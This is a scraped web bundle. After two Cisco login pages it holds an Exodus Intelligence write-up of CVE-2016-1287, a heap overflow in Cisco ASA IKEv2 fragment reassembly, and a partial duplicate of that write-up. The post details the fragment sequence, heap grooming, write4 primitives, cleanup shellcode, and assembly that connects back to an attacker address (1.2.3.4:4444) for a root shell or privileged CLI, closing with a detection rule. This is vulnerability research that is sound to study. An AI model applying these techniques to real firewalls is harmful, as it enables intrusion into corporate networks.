=== Content from bst.cloudapps.cisco.com_2c09b590_20250126_113555.html ===


Back

US

EN

×

Your email address belongs to an organization that also manages
your Cisco account login.

Log in to your organization to also log in to Cisco.

Organization Log In

×

Description here

Contact Support
[Privacy](https://www.cisco.com/c/en/us/about/legal/privacy-full.html)
[Terms &
Conditions](https://www.cisco.com/c/en/us/about/legal/terms-conditions.html)
[Cookies](https://www.cisco.com/c/en/us/about/legal/privacy-full.html#cookies)
[Trademarks](http://www.cisco.com/web/siteassets/legal/trademark.html)
[京ICP备05085544号-1](http://beian.miit.gov.cn)

## Cookies are required

Cookies are disabled on your browser. Please enable Cookies and refresh this page.

[Refresh](.)

![Cisco Identity](https://id.cisco.com/fs/bco/1/fs0a411g73DFKaj7K5d7)

## The page has timed out

If this page does not reload automatically, please refresh your browser.



=== Content from bst.cloudapps.cisco.com_086247e3_20250126_113558.html ===


Back

US

EN

×

Your email address belongs to an organization that also manages
your Cisco account login.

Log in to your organization to also log in to Cisco.

Organization Log In

×

Description here

Contact Support
[Privacy](https://www.cisco.com/c/en/us/about/legal/privacy-full.html)
[Terms &
Conditions](https://www.cisco.com/c/en/us/about/legal/terms-conditions.html)
[Cookies](https://www.cisco.com/c/en/us/about/legal/privacy-full.html#cookies)
[Trademarks](http://www.cisco.com/web/siteassets/legal/trademark.html)
[京ICP备05085544号-1](http://beian.miit.gov.cn)

## Cookies are required

Cookies are disabled on your browser. Please enable Cookies and refresh this page.

[Refresh](.)

![Cisco Identity](https://id.cisco.com/fs/bco/1/fs0a411g73DFKaj7K5d7)

## The page has timed out

If this page does not reload automatically, please refresh your browser.



=== Content from blog.exodusintel.com_c797f6d8_20250125_200503.html ===

[Skip to content](#content "Skip to content")
[![Exodus Intelligence](https://blog.exodusintel.com/wp-content/uploads/2018/10/exodus-final-logo-1_small.png "Exodus Intelligence")](https://blog.exodusintel.com/ "Exodus Intelligence")

Menu

* [Blog](https://blog.exodusintel.com/)
  + [Exploit Techniques](https://blog.exodusintel.com/category/exploit-techniques/)
  + [News](https://blog.exodusintel.com/category/news/)
  + [Training](https://blog.exodusintel.com/category/training/)
  + [Vulnerability Analysis](https://blog.exodusintel.com/category/vulnerability-analysis/)
  + [Other](https://blog.exodusintel.com/category/other/)
* [Offerings](https://exodusintel.com/index.html)
* [Company](https://exodusintel.com/about.html)
* [Capabilities](https://exodusintel.com/zeroday.html)
* [Training](https://exodusintel.com/training.html)
* [Advisories](https://blog.exodusintel.com/advisories/)

[Exodus Blog](https://blog.exodusintel.com)

# Execute My Packet

* [February 10, 2016](https://blog.exodusintel.com/2016/02/10/)
* [Vulnerability Analysis](https://blog.exodusintel.com/category/vulnerability-analysis/), [Exploit Techniques](https://blog.exodusintel.com/category/exploit-techniques/), [News](https://blog.exodusintel.com/category/news/)

## Contributors

David Barksdale, Jordan Gruskovnjak, and Alex Wheeler

## 1. Background

Cisco has issued a fix to address CVE-2016-1287. The Cisco ASA Adaptive Security Appliance is an IP router that acts as an application-aware firewall, network antivirus, intrusion prevention system, and virtual private network (VPN) server. It is advertised as “the industry’s most deployed stateful firewall.” When deployed as a VPN, the device is accessible from the Internet and provides access to a company’s internal networks.

## 2. Summary

The algorithm for re-assembling IKE payloads fragmented with the Cisco fragmentation protocol contains a bounds-checking flaw that allows a heap buffer to be overflowed with attacker-controlled data. A sequence of payloads with carefully chosen parameters causes a buffer of insufficient size to be allocated in the heap which is then overflowed when fragment payloads are copied into the buffer. Attackers can use this vulnerability to execute arbitrary code on affected devices. This flaw affects IKE versions 1 and 2, but this post will focus on specifics related to version 2.

#### Background on Cisco’s IKE Fragmentation Implementation

The Cisco IKE fragmentation protocol splits large IKE payloads into fragments, each with the header illustrated in Figure 1.

[![Cisco IKE fragment](https://blog.exodusintel.com/wp-content/uploads/2016/01/Ike-fragment-300x111.png)](https://blog.exodusintel.com/wp-content/uploads/2016/01/Ike-fragment.png)

Figure 1: Cisco IKE fragment header

Each fragment is sent to the recipient as an IKE packet with a payload of type 132. When a payload is fragmented a *fragment ID* is chosen larger than any previous ID to identify the fragment’s reassembly queue. For any reassembly queue all the fragments are the same *length*, except for possibly the last fragment*.* Each fragment is assigned a *sequence number* starting with 1. The last fragment is identified by a value of 1 in the *last fragment* field. The *next payload* field contains the payload type that was fragmented.

## 3. Vulnerability

Each fragment triggers processing by two key functions: *ikev2\_add\_rcv\_frag()* and *ikev2\_reassemble\_pkt()*. The first parses the fragment and maintains fragment reassembly queues. The second checks the queues and performs reassembly when all the fragments have arrived. The second function is called after each fragment is received and only acts when the number of fragments in the reassembly queue matches the sequence number of the fragment with the *last fragment* flag set.

Below is a snippet of code from *ikev2\_add\_rcv\_frag()* showing the length check and the calculation for updating the reassembly queue length.

[![ikev2_add_rcv_frag() - lina version 9.2.4](https://blog.exodusintel.com/wp-content/uploads/2016/01/ikev2_add_rcv_frag.png)](https://blog.exodusintel.com/wp-content/uploads/2016/01/ikev2_add_rcv_frag.png)

Figure 2: *ikev2\_add\_rcv\_frag()* from lina version 9.2.4

While the Cisco fragment length field is 16 bits, Cisco limits queues to of half that size. The check in the code above is performed before a fragment is queued. The following are important items to note for this code snippet.

* The bounds calculation involves a signed check for a maximum value, but no minimum value.
* The fragment is assumed to be at least as large as the fragment header, 8 bytes.
* The total length of the queue only accounts for the payload size, i.e., the header length is subtracted from each fragment before updating the queue’s size for reassembly.

An understanding of the above issues is useful when examining the reassembly for the fragments. The code for reassembly is large, but a relevant snippet from *ikev2\_reassemble\_pkt()* is illustrated in Figure 3 for discussion.

[![ikev2_reassemble_pkt() from lina 9.2.4](https://blog.exodusintel.com/wp-content/uploads/2016/01/ikev2_reassemble_pkt.png)](https://blog.exodusintel.com/wp-content/uploads/2016/01/ikev2_reassemble_pkt.png)

Figure 3: *ikev2\_reassemble\_pkt()* from lina 9.2.4

The call to *my\_malloc()* is passed the queue length plus a header size. There are several ways to attack this code. The most basic way to attack this code is to create a reassembly queue where one of the fragments has a length less than the default fragment header size of 8 bytes, which underflows the copy length during reassembly. This small value allows the length check (signed) in *ikev2\_add\_rcv\_frag()* to be passed and the copy length to be larger (underflowed) than the allocated buffer size of: reassembly queue length + 8 in *ikev2\_reassemble\_pkt().*

## 4. Exploitation

After having successfully crafted fragments with length less than 8, the corruption happens during the fragments reassembly. However, the corruption cannot be used as-is beyond a DoS due to the negative copy (access violation). Several steps are discussed below to use the vulnerability to obtain remote code execution.

#### Crafting Small Fragments

Crafting small fragments (length < 8) can be accomplished by padding the fragment with valid information past where the fragment should end.  For example, even though a fragment of length 1 should not have a size or sequence number, these fields still need valid values. Other fields that are not checked can be padded with random values.

#### Avoiding the Negative Copy

In order to get remote code execution the negative copy should be avoided. In the interest of brevity we’ll explain the logic and exploitation of it without including the relevant disassembly. Fragments are queued by fragment ID and reassembled using sequence number. All fragments other than the last fragment should have the same size. The following pieces of program logic can be abused to send a sequence of fragments to avoid the negative copy.

1. When processing a fragment with a fragment ID different than the previous ones, the previous ones are cleared from the reassembly queue and the new one is added, but the previous fragment size is not cleared (reinitialization flaw);
2. Fragments with a sequence number of 0 can be added to reassembly queues without having their payloads processed, because the reassembly starts with sequence number 1, but their sizes are still included in the total reassembly size calculation (logic flaw);
3. Multiple fragments with the last fragment bit can be added to a reassembly queue by using the check for sequence number 0 (logic flaw); and
4. Fragments with sequence numbers after a gap in the sequence numbers will not have their payloads processed, but their sizes are still included in the total reassembly size calculation (input validation flaw).

Given the above, the following sequence of fragments can be sent to avoid the negative copy.

* Fragment with ID Y, last fragment bit not set, and size N is sent to set the previous size even though this fragment will be cleared from the queue
* Fragment with ID Z, sequence number 0, size 1, and last fragment bit set is sent to clear previous fragment
* Fragment with ID Z, sequence number 3, size 1, and last fragment bit set
* Fragment with ID Z, sequence number 1, size N, and the last fragment bit clear is sent

The above sequence yields the reassembly queue where fragments with sequence numbers 0 and 3 are not reassembled, but each result in -7 being added to the reassembly queue length. Fragment with sequence number 1 is the only one that will be reassembled and N – 8 bytes will be copied from the payload, thus avoiding the negative copy.

#### Cisco Heap Layout

Some insight of the Cisco heap layout is needed in order to decide what can be achieved with the current memory corruption. The Cisco ASA heap is based on a Doug Lea *malloc()* implementation. The Cisco heap appends a header and a footer to the classic dlmalloc chunk. The headers and footers add extra information for memory integrity and debugging/troubleshooting purposes. An allocated chunk layout is described below.

(gdb) x/70wx 0xccedf970 – 0x28

0xccedf948: 0xe100d4d0 0x00000103 0xa11c0123 0x000000d0

0xccedf958: 0x00000000 0x00000000 0xccedf818 0xccedfa88

0xccedf968: 0x0875ba64 0xe10deaf4 0x41414141 0x41414141

0xccedf978: 0x41414141 0x41414141 0x41414141 0x41414141

0xccedfa28: 0x41414141 0x41414141 0x41414141 0x41414141

…snip…

0xccedfa28: 0x41414141 0x41414141 0x41414141 0x41414141

0xccedfa38: 0x41414141 0x41414141 0xa11ccdef 0xb2ea5e5b

The first 0x28 bytes (in green) are part of the heap header, the 2 last dwords (in blue) belong to the heap footer. The relevant header’s fields from an exploitation perspective are:

* offset 0x00: Header magic
* offset 0x04: Size to next block + 3 bits extra information (bit 1: previous block in use / bit 2: Current block in use)
* offset 0x08: 2nd header magic
* offset 0x0c: Size of chunk data
* offset 0x18: “prev” pointer to linked list of allocated chunk of the same size
* offset 0x1C: “next” pointer to linked list of allocated chunk of the same size

A freed chunk layout is as follows:

(gdb) x/70wx 0xccedf970 – 0x28

0xccedf948: 0xe100d4d0 0x00000101 0xccedf948 0xccedf948

0xccedf958: 0x00000000 0x00000000 0xc8000134 0x00000000

0xccedf968: 0xf3ee0123 0x0877e5bf 0x41414141 0x41414141

0xccedf978: 0x41414141 0x41414141 0x41414141 0x41414141

…snip…

0xccedfa28: 0x41414141 0x41414141 0x41414141 0x41414141

0xccedfa38: 0x41414141 0x41414141 0x5ee33210 0xf3eecdef

Similarly, a freed chunk layout is described below.

* offset 0x00: Header magic
* offset 0x04: Size to next block + 3 bits extra information (bit 1: previous block in use / bit 2: Current block in use)
* offset 0x08: “prev” pointer to linked list of freed chunks of the same size
* offset 0x0C: “next” pointer to linked list of freed chunks of the same size
* offset 0x18: “prev” pointer to linked list of allocated chunk of the same size
* offset 0x1C: “next” pointer to linked list of allocated chunk of the same size

The vulnerable block of size 0xd3 (size used for our exploit, which will make sense later in this post) allocated in the *ikev2\_get\_assembled\_pkt()* looks as follows:

(gdb) x/70wx 0xcbf3d1a8 – 0x28

0xcbf3d180: 0xe100d4d0 0x00000103 0xa11c0123 0x000000d3

0xcbf3d190: 0x00000000 0x00000000 0xcbf3d2b8 0xc80005e4

0xcbf3d1a0: 0x08767b39 0x0877dddc 0x000000cb 0x41414141

0xcbf3d1b0: 0x41414141 0x41414141 0x41414141 0x41414141

…snip…

0xcbf3d260: 0x41414141 0x41414141 0x41414141 0x41414141

0xcbf3d270: 0x41414141 0x41414141 0xef000000 0x00a11ccd

With the Cisco layout in mind, let’s look at what is located behind the vulnerable chunk:

(gdb) x/70wx 0xcbf3d1a8 – 0x28

0xcbf3d180: 0xe100d4d0 0x00000103 0xa11c0123 0x000000d3

0xcbf3d190: 0x00000000 0x00000000 0xcbf3d2b8 0xc80005e4

0xcbf3d1a0: 0x08767b39 0x0877dddc 0x000000cb 0x41414141

0xcbf3d1b0: 0x41414141 0x41414141 0x41414141 0x41414141

…snip…

0xcbf3d260: 0x41414141 0x41414141 0x41414141 0x41414141

0xcbf3d270: 0x41414141 0x41414141 0xef000000 0x00a11ccd

0xcbf3d280: 0xe100d4d0 0x00000031 // adjacent chunk header’s first two dwords.

The first dword of the vulnerable chunk’s data (in red) is reserved for the total size (0xcb) of the fragment data being copied. The last 2 dwords are respectively the header magic and the chunk size of the adjacent 0x30 bytes freed chunk. With a copy of 0xd3 bytes, the fields in red will be corrupted:

(gdb) x/70wx 0xcbf3d1a8 – 0x28

0xcbf3d180: 0xe100d4d0 0x00000103 0xa11c0123 0x000000d3

0xcbf3d190: 0x00000000 0x00000000 0xcbf3d2b8 0xc80005e4

0xcbf3d1a0: 0x08767b39 0x0877dddc 0x000000cb 0x41414141

0xcbf3d1b0: 0x41414141 0x41414141 0x41414141 0x41414141

…snip…

0xcbf3d260: 0x41414141 0x41414141 0x41414141 0x41414141

0xcbf3d270: 0x41414141 0x41414141 0xef000000 0x00a11ccd

0xcbf3d280: 0xe100d4d0 0x00000031

In the end, the magic from the next chunk’s heap header is corrupted, and eventually 1 byte of the next chunk size field can be corrupted. This means that given a correctly crafted heap layout, it is possible to insert a chunk into a freelist reserved for bigger chunks. The attacker can then claim this chunk with another packet and completely corrupt memory overlapped by the fake bigger chunk as will be explained below.

#### Crafting the Heap

In order to be able to achieve interesting things, the attacker has to set the heap in a predictable layout. For that, the *ikev2\_parse\_config\_payload()* function has been used. This function is reached when IKEv2 packets are sent with a Configuration Payload (type 47). The layout of these packets is illustrated in Figure 4.

[![ike config payload](https://blog.exodusintel.com/wp-content/uploads/2016/01/ike-config-payload-300x157.png)](https://blog.exodusintel.com/wp-content/uploads/2016/01/ike-config-payload.png)

Figure 4: IKEv2 config payload packet

The IKE v2 Configuration Payload field descriptions are as follows:

* CFG Type (1 octet) – The type of exchange represented by the Configuration Attributes.
* RESERVED (3 octets)
* Configuration Attributes (variable length)

The Configuration Attributes field is of variable length and allows specifying multiple attributes. The Configuration Attributes are illustrated in Figure 5.

[![IKEv2 Configuration Attributes](https://blog.exodusintel.com/wp-content/uploads/2016/01/IKEv2-Configuration-Attributes-300x119.png)](https://blog.exodusintel.com/wp-content/uploads/2016/01/IKEv2-Configuration-Attributes.png)

Figure 5: IKEv2 Configuration Attributes

The IKEv2 Configuration Attributes field descriptions are as follows:

* Reserved (1 bit) ⋄ Attribute Type (15 bits) – A unique identifier for each of the Configuration Attribute Types.
* Length (2 octets) – Length in octets of value.
* Value (0 or more octets) – The variable-length value of this Configuration Attribute

This will allow the attacker to allocate chunks of arbitrary size with controlled content as after analysing *ikev2\_parse\_config\_payload()* in Figure 6.

[![Figure 6: ikev2_parse_config_payload()](https://blog.exodusintel.com/wp-content/uploads/2016/01/ikev2_parse_config_payload.png)](https://blog.exodusintel.com/wp-content/uploads/2016/01/ikev2_parse_config_payload.png)

Figure 6: *ikev2\_parse\_config\_payload()* lina 9.2.4

This controlled allocation will allow de-fragmenting the heap and achieving the following heap layout below:

[![Figure 7:](https://blog.exodusintel.com/wp-content/uploads/2016/01/1.png)](https://blog.exodusintel.com/wp-content/uploads/2016/01/1.png)

A Configuration Attributes List packet is sent to the router in order to de-fragment the heap, and get further allocations to be contiguous to one another. A fragment of size 0x100 bytes is then sent. Each time the IKEv2 daemon receives a packet it will allocate 0x100 bytes to handle the packet data. This means that a 0x100 bytes chunk will be allocated as below:

[![Figure 8:](https://blog.exodusintel.com/wp-content/uploads/2016/01/2.png)](https://blog.exodusintel.com/wp-content/uploads/2016/01/2.png)

The fragment of 0x100 bytes will then be allocated next to it:

[![3](https://blog.exodusintel.com/wp-content/uploads/2016/01/3.png)](https://blog.exodusintel.com/wp-content/uploads/2016/01/3.png)

After the packet is processed, the first 0x100 byte block is freed since its of not in use any longer, leaving a hole between the de-fragmented heap and the 0x100 bytes attacker fragment:

[![4](https://blog.exodusintel.com/wp-content/uploads/2016/01/4.png)](https://blog.exodusintel.com/wp-content/uploads/2016/01/4.png)

The last fragment of size -7 (with effective size being 0x108 bytes) triggering the overflow is then sent. A 0x100 bytes chunk is allocated to handle the packet, retrieving the 0x100 bytes chunk that has been previously freed:

[![5](https://blog.exodusintel.com/wp-content/uploads/2016/01/5.png)](https://blog.exodusintel.com/wp-content/uploads/2016/01/5.png)

Since the actual packet data is bigger than 0x100, a chunk of size 0x300 is allocated in order to contain all the UDP fragment data, ending freeing the previously allocated 0x100 bytes chunk. The heap then looks as follows:

[![6](https://blog.exodusintel.com/wp-content/uploads/2016/01/6.png)](https://blog.exodusintel.com/wp-content/uploads/2016/01/6.png)

A 0x100 bytes hole is then located right before the attacker controlled fragment. *ikev2\_get\_assembled\_pkt()* will then allocate the vulnerable chunk of 0xd3 size. A chunk of size 0xd0 (because some footer data are used to contain the extra 3 bytes) is returned. Since the heap is de-fragmented, no free chunk is available to handle the request. The 0x100 bytes free block is then split into two block of 0xd0 and 0x30, giving the following heap layout:

[![7](https://blog.exodusintel.com/wp-content/uploads/2016/01/7.png)](https://blog.exodusintel.com/wp-content/uploads/2016/01/7.png)

The vulnerable *my\_memcpy()* call is then reached and ends up corrupting the “size” field of the adjacent 0x30 bytes free chunk. Arbitrary adjacent chunk “size” field corruption has been achieved.

The corrupted freed 0x30 bytes chunk of the previous sections now looks as follows:

0xcbf3d280: 0xe100d4d0 0x00000061 0xc9109b08 0xc800005c

0xcbf3d290: 0xf3ee0123 0x00000000 0x00000000 0x00000000

0xcbf3d2a0: 0x00000000 0x00000000 0x5ee33210 0xf3eecdef

Note the size field (red) is now 0x61 instead of 0x31. The heap manager will now look for the next chunk, not 0x30 bytes further, but 0x60 bytes (0x61 means 0x60 byte size + previous chunk in use bit set), ending up looking into the attacker’s fragment data. Since the fragment’s data is controlled, a fake heap chunk can be crafted. The 0x60 bytes freed chunk now encompasses a part of the attacker’s fragment chunk’s heap header. The fake heap metadata of the next chunk, just shrinks the size of the fragment to 0x100 bytes to conserve the heap integrity and allow the heap manager to locate the chunk adjacent to the fragment. The heap will then look as follows:

(gdb) x/100wx 0xcbf3d1a8 – 0x28

// Vulnerable chunk

0xcbf3d180: 0xe100d4d0 0x00000103 0xa11c0123 0x000000d3

0xcbf3d190: 0x00000000 0x00000000 0xc8000134 0x00000000

0xcbf3d1a0: 0xf3ee0123 0x0877cbcb 0x000000cb 0x41414141

…snip…

0xcbf3d270: 0x41414141 0x41414141 0x10000000 0x005ee332

// 0x60 bytes fake chunk

0xcbf3d280: 0xe100d4d0 0x00000061 0xc9109b08 0xc800005c

0xcbf3d290: 0xf3ee0123 0x00000000 0x00000000 0x00000000

0xcbf3d2a0: 0x00000000 0x00000000 0x5ee33210 0xf3eecdef

0xcbf3d2b0: 0x00000030 0x00000132 0xa11c0123 0x00000100

0xcbf3d2c0: 0x00000000 0x00000000 0xcbf3d088 0xc80005e4

0xcbf3d2d0: 0x08768ca9 0x41414141 0x00010000 0xf3eecdef

// Fake header in attacker’s fragment’s data

0xcbf3d2e0: 0x00000160 0x00000102 0xa11c0123 0x000000e0

0xcbf3d2f0: 0x41414141 0x41414141 0x41414141 0x41414141

0xcbf3d300: 0x41414141 0x41414141 0x41414141 0x41414141

The copy loop in  *ikev2\_get\_assembled\_pkt()* is exited due to not finding fragment sequence number 2 and the vulnerable 0xd0 sized heap chunk is freed later in the same function. The allocator will look for freed chunks before and after the vulnerable chunk in order to perform forward and backward coalescing. If the “size” field of the 0x30 bytes chunk wasn’t tampered with, the allocator would have backward coalesced the 0xd0 chunk with the 0x30 bytes chunk leading to the insertion of a 0x100 bytes chunk into the freelist. However since the “size” field is set to 0x60 bytes, a fake chunk of 0x130 bytes will be inserted into the freelist. The fake 0x130 bytes chunk will encompass the beginning of the adjacent 0x100 bytes block controlled by the attacker.

#### Getting Control

The attacker can now reallocate this block by sending a Configuration Attributes List packet with a bunch of Configuration Attributes of size 0x130. The 0x130 byte chunk will eventually be retrieved, corrupting the header of the attacker’s 0x100 bytes fragment chunk. As explained in the Cisco Heap Layout section, the heap header contains prev and next pointers of previous and next free chunk, whose integrity is not enforced because of the lack of safe-unlinking code. This means that an arbitrary write4 primitive can be achieved during the coalescing of the corrupted chunk. This write4 primitive will be triggered by the attacker at any time by sending a fragment with a different size. When this happens, *ikev2\_add\_rcv\_frag()* is entered and proceeds to free fragments in the linked list. The corrupted fragment will eventually be freed, triggering the write4 memory corruption. One prerequisite for the write4 technique to work is that both prev and next pointers points to writeable data. This means it is not possible to overwrite a function pointers with an address to some .text section to bootstrap a ROP chain. Fortunately the whole memory is executable and there is no ASLR.

The targeted function pointer is the pointer used to add a fragment to the linked list, which will be called right after the write4 corruption to add the new fragment in the linked list inside *ikev2\_add\_rcv\_frag().*The execution flow can then be redirected to an arbitrary writable address in memory. The problem here is the lack of knowledge of the location of attacker’s controlled data at a specific address. To get around this problem, a 2nd write4 corruption will be used during the vulnerable chunk liberation. This is done by targeting other linked list pointers present in the heap header, which are used to keep track of allocated blocks of the same size. The 2nd write4 corruption will be used to craft a fake ROP gadget in memory. The following values were chosen as prev and next pointers for the 2nd write4 corruption: 0xc8002000 and 0xc821ff90 This means that during the 2nd write4 corruption the value 0xc821ff90 will be copied at address 0xc8002000. This address will eventually translate into useful bytecode (nop; jmp dword ptr[ecx]).

The attacker now has a gadget at a known location in writeable memory. The pointers used in the 1st write4 corruption are then set so as to overwrite the targeted function pointer with the address 0xc8002000 containing the ROP gadget. When the control flow is redirected, the program will land at address 0xc8002000 and execute the jmp [ecx] instruction. As can be seen in code snippet above, the ECX register holds a pointer to the newly allocated fragment containing data controlled by the attacker. Arbitrary code execution has been achieved.

#### Cleanup

Since the Cisco router reboots if the lina process crashes, the heap has to be fixed in order to be able to get a reverse shell back to the attacker. In order to fix the memory, pointers from the context object located in a local stack variable, pointing to the option list linked list, are followed. By following the next pointer of the linked list and checking some values, it is possible to locate the 0x130 byte chunk used to perform the memory corruption. When it’s located its header is set to 0xd0 and the adjacent 0x60 size field is set back to 0x30 bytes. The following is our process continuation shellcode.

0xccc54fc1: mov DWORD PTR [edx],0x9b96790 ; fix corrupted function pointer

0xccc54fc7: mov eax,DWORD PTR [ebp-0x8] ; retrieve structure in stack

0xccc54fca: mov eax,DWORD PTR [eax+0x5c]

0xccc54fcd: mov eax,DWORD PTR [eax+0x4]

0xccc54fd0: mov eax,DWORD PTR [eax+0x8]

0xccc54fd3: mov eax,DWORD PTR [eax+0x4]

0xccc54fd6: mov eax,DWORD PTR [eax] ; go to the “next” linked list element

0xccc54fd8: test eax,eax

0xccc54fda: je 0xccc55017

0xccc54fdc: push eax

0xccc54fdd: mov eax,DWORD PTR [eax+0x8] ; follow some more pointers

0xccc54fe0: mov eax,DWORD PTR [eax+0x4]

0xccc54fe3: lea ebx,[eax+0xd8] ; set ebx to the beginning of the corrupted chunk

0xccc54fe9: pop eax

0xccc54fea: cmp DWORD PTR [ebx],0xe100d4d0 ; ensure we are have the right chunk

0xccc54ff0: jne 0xccc54fd6

0xccc54ff2: cmp DWORD PTR [ebx+0x4],0x31 ; Another check

0xccc54ff6: je 0xccc54fd6

0xccc54ff8: mov eax,ebx

0xccc54ffa: sub eax,0x100 ; Point eax to the beginning of the vulnerable chunk

0xccc54fff: mov DWORD PTR [eax+0x4],0x103 ; Fix heap metadata

0xccc55006: mov DWORD PTR [eax+0xc],0xd0

0xccc5500d: mov DWORD PTR [eax+0xf8],0xa11ccdef

The shellcode fixes the corrupted pointer used to take control of the execution flow. Then it retrieves a local variable which holds pointers to the linked list of Configuration Attributes. By following the linked list and enforcing specific values, the shellcode is able to locate the corrupted chunk in memory, and fix its heap metadata to prevent the process from crashing when the chunk is later freed. Then the real payload is executed which will be addressed in the next section.

#### Cisco ASA Shellcode

It’s necessary to use several functions of the lina binary to get a reverse shell or Cisco CLI. It is not possible to use a classic connect-back shellcode because the only network device available is the tap device. The lina binary is responsible for the handling of TCP, UDP, e.g connections, acting as a kind of user-land network driver. Cisco uses the “channel” terminology to handle network connections. Since the shellcodes are too big for this post only the general behaviour will be explained here.

Since the IKEv2 Daemon is actually a thread of the lina process, the shellcode starts by spawning a new thread for the Cisco CLI by calling *process\_create()* and allows the IKEv2 daemon to continue to do its job. Then the daemon allocates a TCP channel connecting back to the attacker’s IP address/port by calling *alloc\_ch():*

push eax ; Points to string “tcp/CONNECT/3/1.2.3.4/4444”

mov eax, 0x80707f0 ; call alloc\_ch()

call eax

The shellcode then sets the channel as responsible for the I/O on stdin/stdout/stderr:

; Set channel as in/out channel for ci/console

mov esi, 0xffffefc8

mov eax, dword ptr gs:[esi]

mov dword ptr [eax + 0x98], ebx ; Points to allocated channel

Then, a structure responsible for the user privileges is allocated, and its privileges are set to 15 (maximum cisco privileges):

mov eax, 0x080F0A80 ; Initialize privileges structure given as parameter

call eax

; Retrieve struct

pop ebx

; Give me full privileges and a cool ‘#’ prompt

mov dword ptr [ebx + 0xc], 0x17ffffff ; Give full privileges

add ebx, 0x14

; Set “enable\_15” username

mov dword ptr [ebx], 0x62616e65

mov dword ptr [ebx + 4], 0x315f656c

mov dword ptr [ebx + 0x8], 0x00000035

Finally the shellcode proceeds to call the *ci\_cons\_shell()* in order to spawn the Cisco CLI back to the attacker’s computer:

push 0x4

push 0x0a52c160 ; some function

mov eax, 0x080F6820 ; ci\_cons\_shell

call eax

Which gives the following result:

Type help or ‘?’ for a list of available commands.

ciscoasa# show running-config enable

show running-config enable

enable password 8Ry2YjIyt7RRXU24 encrypted

ciscoasa#

The reverse shell is trickier to get and ironically probably not as useful as the Cisco CLI. It then enables a hidden SOCKSv5 proxy in the lina process, by calling a function which has been dubbed *start\_loopback\_proxy()*. It is now possible to use classic sockets by connecting to the local SOCKSv5 and telling it to connect-back to the attacker computer. Since the SOCKSv5 protocol is not really complicated this is easily done in assembly. The shellcode then proceeds as a classic connect-back shellcode, by dup2()ing the socket with stdin/stdout/stderr and execve()ing “/bin/sh”:

/bin/sh: can’t access tty; job control turned off

# id

uid=0(root) gid=0(root)

## 5. Detection

Looking for the value of the length field of a Fragment Payload (type 132) IKEv2 or IKEv1 packet allows detecting an exploitation attempt. Any length field with a value < 8 must be considered as an attempt to exploit the vulnerability. The detection also has to deal with the fact that the multiple payloads can be chained inside an IKEv2 packet, and that the Fragment Payload may not be the only/first payload of the packet.

![](https://blog.exodusintel.com/wp-content/uploads/2018/10/exodus-final-logo-1_small.png)

## Intelligence

* [Zero-Day](https://www.exodusintel.com/zeroday.html)
* [N-Day](https://www.exodusintel.com/nday.html)
* [Training](https://www.exodusintel.com/training.html)

## Support

* [Resources](https://www.exodusintel.com/resources.html)
* [Blog](https://blog.exodusintel.com/)
* [FAQ](https://www.exodusintel.com/faq.html)

## Company

* [Why Exodus?](https://www.exodusintel.com/whyexodus.html)
* [About](https://www.exodusintel.com/about.html)
* [Careers](https://www.exodusintel.com/careers.html)

Copyright 2021 Exodus Intelligence



=== Content from blog.exodusintel.com_404372e3_20250126_113559.html ===

[Skip to content](#content "Skip to content")
[![Exodus Intelligence](https://blog.exodusintel.com/wp-content/uploads/2018/10/exodus-final-logo-1_small.png "Exodus Intelligence")](https://blog.exodusintel.com/ "Exodus Intelligence")

Menu

* [Blog](https://blog.exodusintel.com/)
  + [Exploit Techniques](https://blog.exodusintel.com/category/exploit-techniques/)
  + [News](https://blog.exodusintel.com/category/news/)
  + [Training](https://blog.exodusintel.com/category/training/)
  + [Vulnerability Analysis](https://blog.exodusintel.com/category/vulnerability-analysis/)
  + [Other](https://blog.exodusintel.com/category/other/)
* [Offerings](https://exodusintel.com/index.html)
* [Company](https://exodusintel.com/about.html)
* [Capabilities](https://exodusintel.com/zeroday.html)
* [Training](https://exodusintel.com/training.html)
* [Advisories](https://blog.exodusintel.com/advisories/)

[Exodus Blog](https://blog.exodusintel.com)

# Execute My Packet

* [February 10, 2016](https://blog.exodusintel.com/2016/02/10/)
* [Vulnerability Analysis](https://blog.exodusintel.com/category/vulnerability-analysis/), [Exploit Techniques](https://blog.exodusintel.com/category/exploit-techniques/), [News](https://blog.exodusintel.com/category/news/)

## Contributors

David Barksdale, Jordan Gruskovnjak, and Alex Wheeler

## 1. Background

Cisco has issued a fix to address CVE-2016-1287. The Cisco ASA Adaptive Security Appliance is an IP router that acts as an application-aware firewall, network antivirus, intrusion prevention system, and virtual private network (VPN) server. It is advertised as “the industry’s most deployed stateful firewall.” When deployed as a VPN, the device is accessible from the Internet and provides access to a company’s internal networks.

## 2. Summary

The algorithm for re-assembling IKE payloads fragmented with the Cisco fragmentation protocol contains a bounds-checking flaw that allows a heap buffer to be overflowed with attacker-controlled data. A sequence of payloads with carefully chosen parameters causes a buffer of insufficient size to be allocated in the heap which is then overflowed when fragment payloads are copied into the buffer. Attackers can use this vulnerability to execute arbitrary code on affected devices. This flaw affects IKE versions 1 and 2, but this post will focus on specifics related to version 2.

#### Background on Cisco’s IKE Fragmentation Implementation

The Cisco IKE fragmentation protocol splits large IKE payloads into fragments, each with the header illustrated in Figure 1.

[![Cisco IKE fragment](https://blog.exodusintel.com/wp-content/uploads/2016/01/Ike-fragment-300x111.png)](https://blog.exodusintel.com/wp-content/uploads/2016/01/Ike-fragment.png)

Figure 1: Cisco IKE fragment header

Each fragment is sent to the recipient as an IKE packet with a payload of type 132. When a payload is fragmented a *fragment ID* is chosen larger than any previous ID to identify the fragment’s reassembly queue. For any reassembly queue all the fragments are the same *length*, except for possibly the last fragment*.* Each fragment is assigned a *sequence number* starting with 1. The last fragment is identified by a value of 1 in the *last fragment* field. The *next payload* field contains the payload type that was fragmented.

## 3. Vulnerability

Each fragment triggers processing by two key functions: *ikev2\_add\_rcv\_frag()* and *ikev2\_reassemble\_pkt()*. The first parses the fragment and maintains fragment reassembly queues. The second checks the queues and performs reassembly when all the fragments have arrived. The second function is called after each fragment is received and only acts when the number of fragments in the reassembly queue matches the sequence number of the fragment with the *last fragment* flag set.

Below is a snippet of code from *ikev2\_add\_rcv\_frag()* showing the length check and the calculation for updating the reassembly queue length.

[![ikev2_add_rcv_frag() - lina version 9.2.4](https://blog.exodusintel.com/wp-content/uploads/2016/01/ikev2_add_rcv_frag.png)](https://blog.exodusintel.com/wp-content/uploads/2016/01/ikev2_add_rcv_frag.png)

Figure 2: *ikev2\_add\_rcv\_frag()* from lina version 9.2.4

While the Cisco fragment length field is 16 bits, Cisco limits queues to of half that size. The check in the code above is performed before a fragment is queued. The following are important items to note for this code snippet.

* The bounds calculation involves a signed check for a maximum value, but no minimum value.
